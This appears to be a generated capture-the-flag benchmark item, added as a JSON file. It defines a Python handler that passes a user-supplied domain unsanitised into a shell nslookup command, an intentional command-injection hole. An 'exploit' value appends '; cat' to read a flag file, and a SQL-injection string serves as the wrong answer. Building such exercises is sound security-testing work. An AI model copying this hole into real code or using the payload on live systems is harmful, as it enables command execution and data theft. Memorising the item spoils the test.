@@ -1,0 +1,17 @@
+{
+  "name": "unguided-sonnet_9",
+  "app_code": "import subprocess\nimport os\n\ndef handle(query, state):\n    # Store the flag in a temp file accessible from the shell\n    flag_path = \"/tmp/.ctf_flag_9\"\n    with open(flag_path, \"w\") as f:\n        f.write(state[\"flag\"])\n\n    domain = (query.get(\"domain\") or [\"\"])[0]\n    cmd = \"nslookup \" + domain\n    try:\n        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)\n        output = result.stdout + result.stderr\n    except subprocess.TimeoutExpired:\n        output = \"DNS lookup timed out.\"\n    return 200, {\"Content-Type\": \"text/plain\"}, output\n",
+  "state_template": {
+    "flag": "__FLAG__"
+  },
+  "exploit": {
+    "domain": ["example.com; cat /tmp/.ctf_flag_9"]
+  },
+  "benign": {
+    "domain": ["example.com"]
+  },
+  "wrong": {
+    "domain": ["example.com' UNION SELECT flag FROM secrets--"]
+  },
+  "self_check": "flag_substring"
+}
